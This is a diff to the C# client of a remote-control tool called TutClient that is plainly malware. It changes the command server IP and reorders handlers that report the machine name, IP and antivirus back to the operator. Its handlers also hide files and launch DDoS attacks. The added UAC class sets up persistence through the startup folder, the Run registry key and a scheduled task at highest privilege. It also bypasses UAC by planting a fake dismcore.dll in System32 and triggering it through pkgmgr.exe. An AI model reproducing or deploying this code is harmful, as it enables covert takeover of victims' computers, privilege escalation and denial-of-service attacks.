@@ -261,7 +261,9 @@ namespace TutClient
                 {
                     attempts++;
                     Console.WriteLine("Connection attempt " + attempts);
-                    string connectionString = GetIPAddress("192.168.0.10"); //Replace IP with DNS if you want
+
+                    string connectionString = GetIPAddress("192.168.10.56"); //Replace IP with DNS if you want
+                  
                     _clientSocket.Connect(IPAddress.Parse(connectionString), _PORT); //ip is your local ip OR WAN Domain if you going for WAN control
                     Thread.Sleep(500);
                 }
@@ -329,28 +331,10 @@ namespace TutClient
 
             return commands.ToArray();
         }
+            
 
         private static void HandleCommand(string text)
         {
-            if (text == "control.you")
-            {
-                sendCommand("OK! then");
-            }
-
-            if (text.StartsWith("getinfo-"))
-            {
-                int myid = int.Parse(text.Split('-')[1]); //get the client id
-                String allInfo = Environment.MachineName + "|" + GetLocalIPAddress() + "|" + DateTime.Now.ToString() + "|" + AvName();
-                Console.WriteLine(allInfo);
-                String resp = "infoback;" + myid.ToString() + ";" + allInfo;
-                sendCommand(resp);
-            }
-
-            if (text.StartsWith("msg"))
-            {
-                createMessage(text.Split('|'));
-            }
-
             if (text == "tskmgr")// i added this to start task manager
             {
                 Process p = new Process();
@@ -378,6 +362,25 @@ namespace TutClient
             {
                 fps = 100;
                 Console.WriteLine("FPS now 100");
+            }
+          
+            if (text == "control.you")
+            {
+                sendCommand("OK! then");
+            }
+
+            if (text.StartsWith("getinfo-"))
+            {
+                int myid = int.Parse(text.Split('-')[1]); //get the client id
+                String allInfo = Environment.MachineName + "|" + GetLocalIPAddress() + "|" + DateTime.Now.ToString() + "|" + AvName();
+                Console.WriteLine(allInfo);
+                String resp = "infoback;" + myid.ToString() + ";" + allInfo;
+                sendCommand(resp);
+            }
+
+            if (text.StartsWith("msg"))
+            {
+                createMessage(text.Split('|'));
             }
 
             if (text.StartsWith("freq-"))
@@ -409,7 +412,7 @@ namespace TutClient
                         sound = System.Media.SystemSounds.Asterisk;
                         break;
                 }
-
+              
                 sound.Play();
             }
 
@@ -532,6 +535,7 @@ namespace TutClient
                     {
                         Console.WriteLine("List error: " + e.Message);
                     }
+
                     try
                     {
                         String pdata = "setproc|" + name + "|" + responding + "|" + title + "|" + priority + "|" + path + "|" + id;
@@ -566,7 +570,8 @@ namespace TutClient
             {
                 try
                 {
-                    String file = text.Split('|')[1];
+                String file = text.Split('|')[1];
+                  
                 String state = text.Split('|')[2];
 
                 Process p = new Process();
@@ -743,7 +748,6 @@ namespace TutClient
                     reportError(errorType.DIRECTORY_NOT_FOUND, "Target Directory Not found!", "Paste Target: " + target + " cannot be located by manager");
                     return;
                 }
-
                 if (Directory.Exists(source)) sourceType = "dir";
                 switch (sourceType)
                 {
@@ -805,6 +809,7 @@ namespace TutClient
                     reportError(errorType.FILE_AND_DIR_NOT_FOUND, "Cannot hide entry!", "Manager failed to locate " + path);
                     return;
                 }
+
                 File.SetAttributes(path, FileAttributes.Hidden);
             }
 
@@ -1118,7 +1123,7 @@ namespace TutClient
                 DDoS = new ddos(ip, port, protocol, packetSize, threads, delay);
                 DDoS.startDdos();
             }
-
+          
             if (text.StartsWith("ddosk"))
             {
                 DDoS.stopDdos();
@@ -1234,7 +1239,7 @@ namespace TutClient
         {
 
             var buffer = new byte[2048];
-
+          
             try
             {
                 int received = _clientSocket.Receive(buffer, SocketFlags.None);
@@ -1827,6 +1832,118 @@ namespace TutClient
                 return;
             }
 
+        }
+    }
+
+    public class UAC
+    {
+        public enum ProbeMethod
+        {
+            StartUpFolder,
+            Registry,
+            TaskScheduler
+        }
+
+        public void ProbeStart(ProbeMethod pm)
+        {
+            if (pm == ProbeMethod.StartUpFolder)
+            {
+                string suFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                File.Copy(Application.ExecutablePath, suFolder + "\\" + new FileInfo(Application.ExecutablePath).Name);
+            }
+            else if (pm == ProbeMethod.Registry)
+            {
+                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", true);
+                if (key.GetValue("tut_client") != null) key.DeleteValue("tut_client", false);
+                key.SetValue("tut_client", Application.ExecutablePath);
+                key.Close();
+                key.Dispose();
+                key = null;
+            }
+            else if (pm == ProbeMethod.TaskScheduler)
+            {
+                Process deltask = new Process();
+                Process addtask = new Process();
+                deltask.StartInfo.FileName = "cmd.exe";
+                deltask.StartInfo.Arguments = "/c schtasks /Delete tut_client /F";
+                deltask.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                deltask.Start();
+                deltask.WaitForExit();
+                Console.WriteLine("Delete Task Completed");
+                addtask.StartInfo.FileName = "cmd.exe";
+                addtask.StartInfo.Arguments = "/c schtasks /Create /tn tut_client /tr \"" + Application.ExecutablePath + "\" /sc ONLOGON /rl HIGHEST";
+                addtask.Start();
+                addtask.WaitForExit();
+                Console.WriteLine("Task created sucessfully!");
+            }
+        }
+
+        public bool IsAdmin()
+        {
+            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+            var principal = new System.Security.Principal.WindowsPrincipal(identity);
+            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+        }
+
+        private bool Is64Bit()
+        {
+            return Environment.Is64BitOperatingSystem;
+        }
+
+        private void CloseInstance()
+        {
+            Process self = Process.GetCurrentProcess();
+            self.Kill();
+        }
+
+        public bool BypassUAC()
+        {
+            const string dismCoreDll = "dismcore.dll";
+            const string copyFile = "copyFile.exe";
+            const string unattendFile = "unattend.xml";
+            const string launcherFile = "launch.exe";
+
+            //Check core files
+
+            if (!File.Exists(dismCoreDll) || !File.Exists(copyFile) || !File.Exists(unattendFile) || !File.Exists(launcherFile))
+            {
+                Program.reportError(Program.errorType.FILE_NOT_FOUND, "UAC Bypass", "One or more of the core files not found, please upload them manually");
+                return false;
+            }
+
+            //Copy fake dismcore.dll into System32
+
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.FileName = Application.StartupPath + "\\" + copyFile;
+            startInfo.Arguments = "\"" + Application.StartupPath + "\\" + dismCoreDll + "\" C:\\Windows\\System32";
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            Process elevatedCopy = new Process();
+            elevatedCopy.StartInfo = startInfo;
+            elevatedCopy.Start();
+            Console.WriteLine("Waiting for elevated copy to finish");
+            elevatedCopy.WaitForExit();
+            if (elevatedCopy.ExitCode != 0) Console.WriteLine("Error during elevated copy");
+
+            //Create a file pointing to the startup path (reference for the fake dll)
+
+            string tempFileLocation = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\clientlocationx12.txt";
+
+            if (!File.Exists(tempFileLocation)) File.Create(tempFileLocation).Close();
+            File.WriteAllText(tempFileLocation, Application.StartupPath);
+
+            //Trigger dismcore.dll with pgkmgr.exe
+
+            startInfo = new ProcessStartInfo();
+            startInfo.FileName = Application.StartupPath + "\\" + launcherFile;
+            startInfo.Arguments = "C:\\Windows\\System32\\pkgmgr.exe \"/quiet /n:\"" + Application.StartupPath + "\\" + unattendFile + "\"\"";
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            Process bypassProcess = new Process();
+            bypassProcess.StartInfo = startInfo;
+            bypassProcess.Start();
+            Console.WriteLine("Waiting for bypass process to finish");
+            bypassProcess.WaitForExit();
+            Console.WriteLine("Bypass completed");
+            return true;
         }
     }
 
